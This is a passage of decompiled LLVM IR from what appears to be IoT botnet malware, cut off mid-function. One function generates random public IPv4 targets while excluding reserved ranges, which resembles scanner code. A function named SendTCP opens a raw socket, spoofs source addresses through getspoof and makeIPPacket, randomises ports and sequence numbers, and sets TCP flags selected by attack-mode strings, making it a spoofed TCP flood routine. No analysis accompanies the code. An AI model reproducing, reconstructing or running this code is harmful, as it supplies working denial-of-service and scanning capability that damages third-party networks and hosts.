  %tmp95 = mul i32 %v2_805028d, -255
  %v2_805029d = add i32 %v1_805026b, %tmp95
  %v1_80502a9 = call i32 @random()
  store i32 %v1_80502a9, i32* @ecx, align 4
  %v2_80502cb = sdiv i32 %v1_80502a9, 51
  store i32 %v2_80502cb, i32* @ebx, align 4
  %tmp96 = mul i32 %v2_80502cb, -255
  %v2_80502db = add i32 %v1_80502a9, %tmp96
  br label %dec_label_pc_80502e7

dec_label_pc_80502e7:                             ; preds = %entry, %dec_label_pc_80501e7
  %storemerge59.in = phi i32 [ %v2_80502db, %dec_label_pc_80501e7 ], [ %v2_80501d6, %entry ]
  %stack_var_-18.0.in.in = phi i32 [ %v2_805029d, %dec_label_pc_80501e7 ], [ %v2_8050198, %entry ]
  %stack_var_-19.0.in.in = phi i32 [ %v2_805025f, %dec_label_pc_80501e7 ], [ %v2_805015a, %entry ]
  %stack_var_-20.0.in = phi i32 [ %v2_8050221, %dec_label_pc_80501e7 ], [ %v2_805011c, %entry ]
  %stack_var_-19.0.in = trunc i32 %stack_var_-19.0.in.in to i8
  %stack_var_-18.0.in = trunc i32 %stack_var_-18.0.in.in to i8
  %v3_80502eb = trunc i32 %stack_var_-20.0.in to i8
  %v4_80502eb = icmp eq i8 %v3_80502eb, 0
  br i1 %v4_80502eb, label %dec_label_pc_80501e7, label %dec_label_pc_80502f3

dec_label_pc_80502f3:                             ; preds = %dec_label_pc_80502e7
  %v10_80502f7 = icmp eq i8 %v3_80502eb, 10
  br i1 %v10_80502f7, label %dec_label_pc_80501e7, label %dec_label_pc_80502ff

dec_label_pc_80502ff:                             ; preds = %dec_label_pc_80502f3
  %v10_8050303 = icmp eq i8 %v3_80502eb, 100
  %v1_8050305 = icmp eq i1 %v10_8050303, false
  br i1 %v1_8050305, label %dec_label_pc_805031b, label %dec_label_pc_8050307

dec_label_pc_8050307:                             ; preds = %dec_label_pc_80502ff
  %tmp97 = icmp ult i8 %stack_var_-19.0.in, 64
  br i1 %tmp97, label %dec_label_pc_805031b, label %dec_label_pc_805030f

dec_label_pc_805030f:                             ; preds = %dec_label_pc_8050307
  %v5_8050313 = icmp slt i8 %stack_var_-19.0.in, 0
  %v1_8050315 = icmp eq i1 %v5_8050313, false
  br i1 %v1_8050315, label %dec_label_pc_80501e7, label %dec_label_pc_805031b

dec_label_pc_805031b:                             ; preds = %dec_label_pc_805030f, %dec_label_pc_8050307, %dec_label_pc_80502ff
  %v10_805031f = icmp eq i8 %v3_80502eb, 127
  br i1 %v10_805031f, label %dec_label_pc_80501e7, label %dec_label_pc_8050327

dec_label_pc_8050327:                             ; preds = %dec_label_pc_805031b
  %v11_805032b = icmp eq i8 %v3_80502eb, -87
  %v1_805032d = icmp eq i1 %v11_805032b, false
  br i1 %v1_805032d, label %dec_label_pc_805033b, label %dec_label_pc_805032f

dec_label_pc_805032f:                             ; preds = %dec_label_pc_8050327
  %v11_8050333 = icmp eq i8 %stack_var_-19.0.in, -2
  br i1 %v11_8050333, label %dec_label_pc_80501e7, label %dec_label_pc_805033b

dec_label_pc_805033b:                             ; preds = %dec_label_pc_805032f, %dec_label_pc_8050327
  %v11_805033f = icmp eq i8 %v3_80502eb, -84
  %v1_8050341 = icmp eq i1 %v11_805033f, false
  br i1 %v1_8050341, label %dec_label_pc_8050357, label %dec_label_pc_8050343

dec_label_pc_8050343:                             ; preds = %dec_label_pc_805033b
  %tmp98 = icmp ult i8 %stack_var_-19.0.in, 17
  br i1 %tmp98, label %dec_label_pc_805034b, label %dec_label_pc_8050357

dec_label_pc_805034b:                             ; preds = %dec_label_pc_8050343
  br i1 true, label %dec_label_pc_80501e7, label %dec_label_pc_8050357

dec_label_pc_8050357:                             ; preds = %dec_label_pc_8050343, %dec_label_pc_805034b, %dec_label_pc_805033b
  %v8_805035b = icmp eq i8 %v3_80502eb, -64
  %v1_805035d = icmp eq i1 %v8_805035b, false
  br i1 %v1_805035d, label %dec_label_pc_805038f, label %dec_label_pc_805035f

dec_label_pc_805035f:                             ; preds = %dec_label_pc_8050357
  %v4_8050363 = icmp eq i8 %stack_var_-19.0.in, 0
  %v1_8050365 = icmp eq i1 %v4_8050363, false
  br i1 %v1_8050365, label %dec_label_pc_805037b, label %dec_label_pc_8050367

dec_label_pc_8050367:                             ; preds = %dec_label_pc_805035f
  %v10_805036b = icmp eq i8 %stack_var_-18.0.in, 2
  br i1 %v10_805036b, label %dec_label_pc_80501e7, label %dec_label_pc_805037b

dec_label_pc_805037b:                             ; preds = %dec_label_pc_8050367, %dec_label_pc_805035f
  %v10_805037f = icmp eq i8 %stack_var_-19.0.in, 88
  %v1_8050381 = icmp eq i1 %v10_805037f, false
  br i1 %v1_8050381, label %dec_label_pc_8050397, label %dec_label_pc_8050383

dec_label_pc_8050383:                             ; preds = %dec_label_pc_805037b
  %v10_8050387 = icmp eq i8 %stack_var_-18.0.in, 99
  br i1 %v10_8050387, label %dec_label_pc_80501e7, label %dec_label_pc_8050397

dec_label_pc_805038f:                             ; preds = %dec_label_pc_8050357
  br label %dec_label_pc_80503a3

dec_label_pc_8050397:                             ; preds = %dec_label_pc_8050383, %dec_label_pc_805037b
  %v11_805039b = icmp eq i8 %stack_var_-19.0.in, -88
  br i1 %v11_805039b, label %dec_label_pc_80501e7, label %dec_label_pc_80503a3

dec_label_pc_80503a3:                             ; preds = %dec_label_pc_805038f, %dec_label_pc_8050397
  %v11_80503a7 = icmp eq i8 %v3_80502eb, -58
  %v1_80503a9 = icmp eq i1 %v11_80503a7, false
  br i1 %v1_80503a9, label %dec_label_pc_80503c3.thread, label %dec_label_pc_80503ab

dec_label_pc_80503c3.thread:                      ; preds = %dec_label_pc_80503a3
  br label %dec_label_pc_80503df

dec_label_pc_80503ab:                             ; preds = %dec_label_pc_80503a3
  %v10_80503af = icmp eq i8 %stack_var_-19.0.in, 18
  br i1 %v10_80503af, label %dec_label_pc_80501e7, label %dec_label_pc_80503b7

dec_label_pc_80503b7:                             ; preds = %dec_label_pc_80503ab
  %v10_80503bb = icmp eq i8 %stack_var_-19.0.in, 19
  br i1 %v10_80503bb, label %dec_label_pc_80501e7, label %dec_label_pc_80503cb

dec_label_pc_80503cb:                             ; preds = %dec_label_pc_80503b7
  %v10_80503cf = icmp eq i8 %stack_var_-19.0.in, 51
  %v1_80503d1 = icmp eq i1 %v10_80503cf, false
  br i1 %v1_80503d1, label %dec_label_pc_80503df, label %dec_label_pc_80503d3

dec_label_pc_80503d3:                             ; preds = %dec_label_pc_80503cb
  %v10_80503d7 = icmp eq i8 %stack_var_-18.0.in, 100
  br i1 %v10_80503d7, label %dec_label_pc_80501e7, label %dec_label_pc_80503df

dec_label_pc_80503df:                             ; preds = %dec_label_pc_80503c3.thread, %dec_label_pc_80503d3, %dec_label_pc_80503cb
  %v11_80503e3 = icmp eq i8 %v3_80502eb, -53
  %v1_80503e5 = icmp eq i1 %v11_80503e3, false
  br i1 %v1_80503e5, label %dec_label_pc_80503fb, label %dec_label_pc_80503e7

dec_label_pc_80503e7:                             ; preds = %dec_label_pc_80503df
  %v4_80503eb = icmp eq i8 %stack_var_-19.0.in, 0
  %v1_80503ed = icmp eq i1 %v4_80503eb, false
  br i1 %v1_80503ed, label %dec_label_pc_80503fb, label %dec_label_pc_80503ef

dec_label_pc_80503ef:                             ; preds = %dec_label_pc_80503e7
  %v10_80503f3 = icmp eq i8 %stack_var_-18.0.in, 113
  br i1 %v10_80503f3, label %dec_label_pc_80501e7, label %dec_label_pc_80503fb

dec_label_pc_80503fb:                             ; preds = %dec_label_pc_80503ef, %dec_label_pc_80503e7, %dec_label_pc_80503df
  %v10_80503ff = icmp eq i8 %v3_80502eb, 62
  %v1_8050401 = icmp eq i1 %v10_80503ff, false
  br i1 %v1_8050401, label %dec_label_pc_805040f, label %dec_label_pc_8050403

dec_label_pc_8050403:                             ; preds = %dec_label_pc_80503fb
  %tmp99 = icmp ult i8 %stack_var_-19.0.in, 31
  br i1 %tmp99, label %dec_label_pc_80501e7, label %dec_label_pc_805040f

dec_label_pc_805040f:                             ; preds = %dec_label_pc_8050403, %dec_label_pc_80503fb
  %v11_8050413 = icmp eq i8 %v3_80502eb, -49
  %v1_8050415 = icmp eq i1 %v11_8050413, false
  br i1 %v1_8050415, label %dec_label_pc_805042b, label %dec_label_pc_8050417

dec_label_pc_8050417:                             ; preds = %dec_label_pc_805040f
  %tmp100 = icmp ult i8 %stack_var_-19.0.in, 31
  br i1 %tmp100, label %dec_label_pc_805042b, label %dec_label_pc_805041f

dec_label_pc_805041f:                             ; preds = %dec_label_pc_8050417
  %tmp101 = icmp ult i8 %stack_var_-18.0.in, 121
  br i1 %tmp101, label %dec_label_pc_80501e7, label %dec_label_pc_805042b

dec_label_pc_805042b:                             ; preds = %dec_label_pc_805041f, %dec_label_pc_8050417, %dec_label_pc_805040f
  %v10_805042f = icmp eq i8 %v3_80502eb, 65
  %v1_8050431 = icmp eq i1 %v10_805042f, false
  br i1 %v1_8050431, label %dec_label_pc_8050447, label %dec_label_pc_8050433

dec_label_pc_8050433:                             ; preds = %dec_label_pc_805042b
  %tmp102 = icmp ult i8 %stack_var_-19.0.in, -32
  br i1 %tmp102, label %dec_label_pc_8050447, label %dec_label_pc_805043b

dec_label_pc_805043b:                             ; preds = %dec_label_pc_8050433
  %tmp103 = icmp ult i8 %stack_var_-18.0.in, -29
  br i1 %tmp103, label %dec_label_pc_80501e7, label %dec_label_pc_8050447

dec_label_pc_8050447:                             ; preds = %dec_label_pc_805043b, %dec_label_pc_8050433, %dec_label_pc_805042b
  %v11_805044b = icmp eq i8 %v3_80502eb, -61
  %v1_805044d = icmp eq i1 %v11_805044b, false
  br i1 %v1_805044d, label %dec_label_pc_805045b, label %dec_label_pc_805044f

dec_label_pc_805044f:                             ; preds = %dec_label_pc_8050447
  %v10_8050453 = icmp eq i8 %stack_var_-19.0.in, 10
  br i1 %v10_8050453, label %dec_label_pc_80501e7, label %dec_label_pc_805045b

dec_label_pc_805045b:                             ; preds = %dec_label_pc_805044f, %dec_label_pc_8050447
  %v11_805045f = icmp eq i8 %v3_80502eb, -40
  %v1_8050461 = icmp eq i1 %v11_805045f, false
  %.pre89 = urem i32 %stack_var_-19.0.in.in, 256
  br i1 %v1_8050461, label %dec_label_pc_805047b, label %dec_label_pc_8050463

dec_label_pc_8050463:                             ; preds = %dec_label_pc_805045b
  %v10_8050467 = icmp eq i8 %stack_var_-19.0.in, 25
  br i1 %v10_8050467, label %dec_label_pc_80501e7, label %dec_label_pc_805046f

dec_label_pc_805046f:                             ; preds = %dec_label_pc_8050463
  %v10_8050473 = icmp eq i8 %stack_var_-19.0.in, 94
  br i1 %v10_8050473, label %dec_label_pc_80501e7, label %dec_label_pc_805047b

dec_label_pc_805047b:                             ; preds = %dec_label_pc_805045b, %dec_label_pc_805046f
  %v11_805047f = icmp eq i8 %v3_80502eb, -44
  %v1_8050481 = icmp eq i1 %v11_805047f, false
  br i1 %v1_8050481, label %dec_label_pc_805048f, label %dec_label_pc_8050483

dec_label_pc_8050483:                             ; preds = %dec_label_pc_805047b
  %v10_8050487 = icmp eq i8 %stack_var_-19.0.in, 56
  br i1 %v10_8050487, label %dec_label_pc_80501e7, label %dec_label_pc_805048f

dec_label_pc_805048f:                             ; preds = %dec_label_pc_805047b, %dec_label_pc_8050483
  store i32 0, i32* %stack_var_-36, align 4
  %v4_80504ab54 = urem i32 %storemerge59.in, 256
  store i32 %v4_80504ab54, i32* @edx, align 4
  %v4_80504b255 = urem i32 %stack_var_-18.0.in.in, 256
  store i32 %v4_80504b255, i32* @ecx, align 4
  store i32 %.pre89, i32* @ebx, align 4
  %v1_80504c4 = urem i32 %stack_var_-20.0.in, 256
  store i32 ptrtoint ([12 x i8]* @global_var_806a197.112 to i32), i32* @esi, align 4
  %v2_80504cc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_80504cc, i32* @edi, align 4
  %v7_80504e6 = call i32 @szprintf(i32 %v2_80504cc, i32 ptrtoint ([12 x i8]* @global_var_806a197.112 to i32), i32 %v1_80504c4, i32 %.pre89, i32 %v4_80504b255, i32 %v4_80504ab54)
  %v1_80504f1 = call i32 @inet_addr(i32 %v2_80504cc)
  %v2_80504f9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80504f9, i32* @ebx, align 4
  store i32 %v0_80500d6, i32* @esi, align 4
  store i32 %v0_80500d5, i32* @edi, align 4
  ret i32 %v1_80504f1

; uselistorder directives
  uselistorder i32 %v4_80504ab54, { 1, 0 }
  uselistorder i8 %stack_var_-19.0.in, { 0, 1, 2, 3, 4, 5, 6, 17, 7, 8, 9, 10, 11, 16, 12, 13, 15, 14 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 ptrtoint ([12 x i8]* @global_var_806a197.112 to i32), { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805048f, { 1, 0 }
  uselistorder label %dec_label_pc_805047b, { 1, 0 }
  uselistorder label %dec_label_pc_80503df, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80503a3, { 1, 0 }
  uselistorder label %dec_label_pc_8050357, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80502e7, { 1, 0 }
}

define i32 @SendTCP() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp54 = call i16 @__decompiler_undefined_function_2()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-20 = alloca i8*, align 4
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050501 = load i32, i32* @edi, align 4
  %v0_8050502 = load i32, i32* @esi, align 4
  %v0_8050503 = load i32, i32* @ebx, align 4
  store i32 %v0_8050503, i32* %stack_var_-16, align 4
  %v5_8050504 = icmp ult i32* %stack_var_-16, inttoptr (i32 236 to i32*)
  store i1 %v5_8050504, i1* %cf.global-to-local, align 1
  %v15_8050504 = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v15_8050504, i32* %eax.global-to-local, align 4
  %v1_805050f = call i32 @listFork(i32 %v15_8050504)
  store i32 %v1_805050f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050514 = icmp eq i32 %v1_805050f, 0
  br i1 %v1_8050514, label %dec_label_pc_805051d, label %dec_label_pc_8050c18

dec_label_pc_805051d:                             ; preds = %entry
  store i32 %tmp104, i32* %eax.global-to-local, align 4
  %v1_8050526 = inttoptr i32 %tmp104 to i32*
  %v2_8050526 = load i32, i32* %v1_8050526, align 4
  store i32 %tmp104, i32* %eax.global-to-local, align 4
  %v1_805052e = add i32 %tmp104, 4
  %v2_805052e = inttoptr i32 %v1_805052e to i32*
  %v3_805052e = load i32, i32* %v2_805052e, align 4
  store i32 %tmp104, i32* %eax.global-to-local, align 4
  %v1_8050537 = add i32 %tmp104, 8
  %v2_8050537 = inttoptr i32 %v1_8050537 to i32*
  %v3_8050537 = load i32, i32* %v2_8050537, align 4
  store i32 %tmp104, i32* %eax.global-to-local, align 4
  %v1_8050540 = add i32 %tmp104, 12
  %v2_8050540 = inttoptr i32 %v1_8050540 to i32*
  %v3_8050540 = load i32, i32* %v2_8050540, align 4
  store i32 %tmp104, i32* %eax.global-to-local, align 4
  %v1_8050549 = add i32 %tmp104, 16
  %v2_8050549 = inttoptr i32 %v1_8050549 to i32*
  %v3_8050549 = load i32, i32* %v2_8050549, align 4
  store i32 %tmp104, i32* %eax.global-to-local, align 4
  %v1_8050552 = add i32 %tmp104, 20
  %v2_8050552 = inttoptr i32 %v1_8050552 to i32*
  %v3_8050552 = load i32, i32* %v2_8050552, align 4
  store i32 %tmp104, i32* %eax.global-to-local, align 4
  %v1_805055b = add i32 %tmp104, 24
  %v2_805055b = inttoptr i32 %v1_805055b to i32*
  %v3_805055b = load i32, i32* %v2_805055b, align 4
  store i32 %v3_8050552, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-92, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805056d = icmp eq i32 %v3_805052e, 0
  %v1_8050571 = icmp eq i1 %v4_805056d, false
  br i1 %v1_8050571, label %dec_label_pc_8050581, label %dec_label_pc_8050573

dec_label_pc_8050573:                             ; preds = %dec_label_pc_805051d
  %v1_8050573 = call i32 @rand_cmwc(i32 %v3_8050552)
  br label %dec_label_pc_8050596

dec_label_pc_8050581:                             ; preds = %dec_label_pc_805051d
  %v1_8050584 = urem i32 %v3_805052e, 65536
  store i32 %v1_8050584, i32* %eax.global-to-local, align 4
  store i32 %v1_8050584, i32* %stack_var_-252, align 4
  %v1_805058a = trunc i32 %v3_805052e to i16
  %v2_805058a = call i32 @htons(i16 %v1_805058a)
  br label %dec_label_pc_8050596

dec_label_pc_8050596:                             ; preds = %dec_label_pc_8050573, %dec_label_pc_8050581
  %v2_8050596 = ptrtoint i32* %stack_var_-92 to i32
  %v5_8050599 = icmp eq i32* %stack_var_-92, inttoptr (i32 -4 to i32*)
  store i1 %v5_8050599, i1* %cf.global-to-local, align 1
  store i32 %v2_8050526, i32* %eax.global-to-local, align 4
  store i32 %v2_8050526, i32* %stack_var_-252, align 4
  %v3_80505a6 = call i32 @getHost(i32 %v2_8050526, i32* nonnull %stack_var_-88)
  store i32 %v3_80505a6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80505ab = icmp eq i32 %v3_80505a6, 0
  br i1 %v1_80505ab, label %dec_label_pc_80505b4, label %dec_label_pc_8050c18

dec_label_pc_80505b4:                             ; preds = %dec_label_pc_8050596
  %v5_80505c7 = icmp ugt i32* %stack_var_-92, inttoptr (i32 -9 to i32*)
  store i1 %v5_80505c7, i1* %cf.global-to-local, align 1
  %v15_80505c7 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v15_80505c7, i32* %eax.global-to-local, align 4
  store i32 %v15_80505c7, i32* %stack_var_-252, align 4
  %v3_80505cd = bitcast i32* %stack_var_-84 to i8*
  %v4_80505cd = call i32 @__GI_memset(i8* %v3_80505cd, i32 0, i32 8)
  store i32 %v4_80505cd, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-252, align 4
  %v3_80505e9 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_80505e9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80505f1 = icmp eq i32 %v3_80505e9, 0
  %v1_80505f5 = icmp eq i1 %v4_80505f1, false
  br i1 %v1_80505f5, label %dec_label_pc_80505fc, label %dec_label_pc_8050c18

dec_label_pc_80505fc:                             ; preds = %dec_label_pc_80505b4
  store i32 1, i32* %stack_var_-96, align 4
  %v2_805060b = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v3_80505e9, i32* %eax.global-to-local, align 4
  store i32 %v3_80505e9, i32* %stack_var_-252, align 4
  %v5_8050628 = call i32 @__GI_setsockopt(i32 %v3_80505e9, i32 0, i32 3, i32 %v2_805060b, i32 4)
  store i32 %v5_8050628, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_805062d = icmp slt i32 %v5_8050628, 0
  %v1_805062f = icmp eq i1 %v2_805062d, false
  br i1 %v1_805062f, label %dec_label_pc_8050636, label %dec_label_pc_8050c18

dec_label_pc_8050636:                             ; preds = %dec_label_pc_80505fc
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050636 = icmp eq i32 %v3_805055b, 0
  %v1_805063a = icmp eq i1 %v4_8050636, false
  br i1 %v1_805063a, label %dec_label_pc_8050645, label %dec_label_pc_805065b

dec_label_pc_8050645:                             ; preds = %dec_label_pc_8050636
  %v5_805064c = sub i32 32, %v3_805055b
  %v10_805064c = icmp ugt i32 %v3_805055b, 32
  store i1 %v10_805064c, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8050654 = urem i32 %v5_805064c, 32
  %v4_8050654 = icmp eq i32 %v2_8050654, 0
  br i1 %v4_8050654, label %bb116, label %bb

bb:                                               ; preds = %dec_label_pc_8050645
  %v5_8050654 = shl i32 1, %v2_8050654
  store i32 %v5_8050654, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb116

bb116:                                            ; preds = %dec_label_pc_8050645, %bb
  %v0_8050656 = phi i32 [ 1, %dec_label_pc_8050645 ], [ %v5_8050654, %bb ]
  %v1_8050656 = sub i32 0, %v0_8050656
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_8050656, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805065b

dec_label_pc_805065b:                             ; preds = %dec_label_pc_8050636, %bb116
  %v1_805065e = add i32 %v3_8050549, 40
  %v1_805066a = add i32 %v3_8050549, 70
  %v2_805066d = and i32 %v1_805066a, -16
  %v0_8050673 = load i32, i32* @esp, align 4
  %v2_8050673 = sub i32 %v0_8050673, %v2_805066d
  %v1_8050675 = add i32 %v2_8050673, 24
  store i32 %v1_8050675, i32* %edx.global-to-local, align 4
  %v1_805067f = add i32 %v2_8050673, 39
  %v2_8050682 = and i32 %v1_805067f, -16
  store i32 %v2_8050682, i32* @ecx, align 4
  %v1_805069a = add i32 %v2_8050682, 20
  %v5_805069d = inttoptr i32 %v1_805069a to i16*
  %v1_80506a3 = add i32 %v3_8050549, 20
  %v5_80506a3 = icmp ugt i32 %v3_8050549, -21
  store i1 %v5_80506a3, i1* %cf.global-to-local, align 1
  store i32 %v1_80506a3, i32* %eax.global-to-local, align 4
  store i32 %v1_80506a3, i32* @ebx, align 4
  %v1_80506a8 = call i32 @getspoof(i32 %v1_805065e)
  store i32 %v1_80506a8, i32* %eax.global-to-local, align 4
  %v1_80506ad = load i32, i32* @esp, align 4
  %v2_80506ad = inttoptr i32 %v1_80506ad to i32*
  store i32 %v1_80506a8, i32* %v2_80506ad, align 4
  %v2_80506b0 = call i32 @htonl(i32 %v1_805069a)
  %v3_80506b5 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_80506b5, i32* %edx.global-to-local, align 4
  %v0_80506b8 = load i32, i32* @ebx, align 4
  %v1_80506b8 = load i32, i32* @esp, align 4
  %v2_80506b8 = add i32 %v1_80506b8, 16
  %v3_80506b8 = inttoptr i32 %v2_80506b8 to i32*
  store i32 %v0_80506b8, i32* %v3_80506b8, align 4
  %v0_80506bc = load i32, i32* @esp, align 4
  %v1_80506bc = add i32 %v0_80506bc, 12
  %v2_80506bc = inttoptr i32 %v1_80506bc to i32*
  store i32 6, i32* %v2_80506bc, align 4
  %v1_80506c4 = load i32, i32* @esp, align 4
  %v2_80506c4 = add i32 %v1_80506c4, 8
  %v3_80506c4 = inttoptr i32 %v2_80506c4 to i32*
  store i32 %v2_80506b0, i32* %v3_80506c4, align 4
  %v0_80506c8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80506c8 = load i32, i32* @esp, align 4
  %v2_80506c8 = add i32 %v1_80506c8, 4
  %v3_80506c8 = inttoptr i32 %v2_80506c8 to i32*
  store i32 %v0_80506c8, i32* %v3_80506c8, align 4
  store i32 %v2_8050682, i32* %eax.global-to-local, align 4
  %v1_80506cf = load i32, i32* @esp, align 4
  %v2_80506cf = inttoptr i32 %v1_80506cf to i32*
  store i32 %v2_8050682, i32* %v2_80506cf, align 4
  %v0_80506d2 = call i32 @makeIPPacket()
  store i32 %v0_80506d2, i32* %eax.global-to-local, align 4
  %v2_80506d7 = call i32 @rand_cmwc(i32 %v1_805069a)
  %v1_80506dc = urem i32 %v2_80506d7, 65536
  store i32 %v1_80506dc, i32* %edx.global-to-local, align 4
  store i32 %v1_805069a, i32* %eax.global-to-local, align 4
  %v1_80506e2 = trunc i32 %v2_80506d7 to i16
  store i16 %v1_80506e2, i16* %v5_805069d, align 4
  %v2_80506e5 = call i32 @rand_cmwc(i32 %v1_805069a)
  %v2_80506ef = add i32 %v2_8050682, 24
  %v3_80506ef = inttoptr i32 %v2_80506ef to i32*
  store i32 %v2_80506e5, i32* %v3_80506ef, align 8
  store i32 %v1_805069a, i32* %eax.global-to-local, align 4
  %v1_80506f5 = add i32 %v2_8050682, 28
  %v2_80506f5 = inttoptr i32 %v1_80506f5 to i32*
  store i32 0, i32* %v2_80506f5, align 4
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v1_80506ff = add i32 %v2_8050682, 32
  %v2_80506ff = inttoptr i32 %v1_80506ff to i8*
  %v3_80506ff = load i8, i8* %v2_80506ff, align 16
  %v2_8050703 = urem i8 %v3_80506ff, 16
  %v2_8050705 = or i8 %v2_8050703, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_8050705, i8* %v2_80506ff, align 16
  store i32 %v3_8050540, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_805071f = inttoptr i32 %v3_8050540 to i8*
  store i32 ptrtoint ([4 x i8]* @global_var_806a7c1.143 to i32), i32* @edi, align 4
  %v7_8050728 = call i32 @_strncmp(i8* %v4_805071f, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7c1.143, i32 0, i32 0), i32 4)
  %v8_8050728 = urem i32 %v7_8050728, 2
  %v9_8050728 = icmp eq i32 %v8_8050728, 0
  %v0_805072a = load i1, i1* %cf.global-to-local, align 1
  %v2_805072a = or i1 %v0_805072a, %v9_8050728
  %v3_805072a = zext i1 %v2_805072a to i32
  %v4_805072a = load i32, i32* %edx.global-to-local, align 4
  %v5_805072a = and i32 %v4_805072a, -256
  %v6_805072a = or i32 %v3_805072a, %v5_805072a
  %v7_805072a = xor i32 %v6_805072a, 1
  store i32 %v7_805072a, i32* %edx.global-to-local, align 4
  %v1_8050732 = trunc i32 %v7_805072a to i8
  %v3_8050732 = zext i1 %v0_805072a to i8
  %v4_8050732 = sub nsw i8 %v1_8050732, %v3_8050732
  %v15_8050732 = icmp eq i8 %v4_8050732, 0
  %v2_8050736 = sext i8 %v4_8050732 to i32
  store i32 %v2_8050736, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805073b = icmp eq i1 %v15_8050732, false
  br i1 %v1_805073b, label %dec_label_pc_805078a, label %dec_label_pc_805073d

dec_label_pc_805073d:                             ; preds = %dec_label_pc_805065b
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v1_8050740 = add i32 %v2_8050682, 33
  %v2_8050740 = inttoptr i32 %v1_8050740 to i8*
  %v3_8050740 = load i8, i8* %v2_8050740, align 1
  %v2_8050744 = or i8 %v3_8050740, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050744 = zext i8 %v2_8050744 to i32
  store i32 %v7_8050744, i32* %eax.global-to-local, align 4
  store i8 %v2_8050744, i8* %v2_8050740, align 1
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v3_805074c = load i8, i8* %v2_8050740, align 1
  %v2_8050750 = or i8 %v3_805074c, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050750 = zext i8 %v2_8050750 to i32
  store i32 %v7_8050750, i32* %eax.global-to-local, align 4
  store i8 %v2_8050750, i8* %v2_8050740, align 1
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v3_8050758 = load i8, i8* %v2_8050740, align 1
  %v2_805075c = or i8 %v3_8050758, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_805075c = zext i8 %v2_805075c to i32
  store i32 %v7_805075c, i32* %eax.global-to-local, align 4
  store i8 %v2_805075c, i8* %v2_8050740, align 1
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v3_8050764 = load i8, i8* %v2_8050740, align 1
  %v2_8050768 = or i8 %v3_8050764, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050768 = zext i8 %v2_8050768 to i32
  store i32 %v7_8050768, i32* %eax.global-to-local, align 4
  store i8 %v2_8050768, i8* %v2_8050740, align 1
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v3_8050770 = load i8, i8* %v2_8050740, align 1
  %v2_8050774 = or i8 %v3_8050770, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050774 = zext i8 %v2_8050774 to i32
  store i32 %v7_8050774, i32* %eax.global-to-local, align 4
  store i8 %v2_8050774, i8* %v2_8050740, align 1
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v3_805077c = load i8, i8* %v2_8050740, align 1
  %v2_8050780 = or i8 %v3_805077c, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050780 = zext i8 %v2_8050780 to i32
  store i32 %v7_8050780, i32* %eax.global-to-local, align 4
  store i8 %v2_8050780, i8* %v2_8050740, align 1
  br label %dec_label_pc_8050a98

dec_label_pc_805078a:                             ; preds = %dec_label_pc_805065b
  store i32 %v3_8050540, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_806a7c5.144 to i32), i32* @edi, align 4
  %v7_80507ba = call i32 @_strncmp(i8* %v4_805071f, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806a7c5.144, i32 0, i32 0), i32 5)
  %v8_80507ba = urem i32 %v7_80507ba, 2
  %v9_80507ba = icmp eq i32 %v8_80507ba, 0
  %v0_80507bc = load i1, i1* %cf.global-to-local, align 1
  %v2_80507bc = or i1 %v0_80507bc, %v9_80507ba
  %v3_80507bc = zext i1 %v2_80507bc to i32
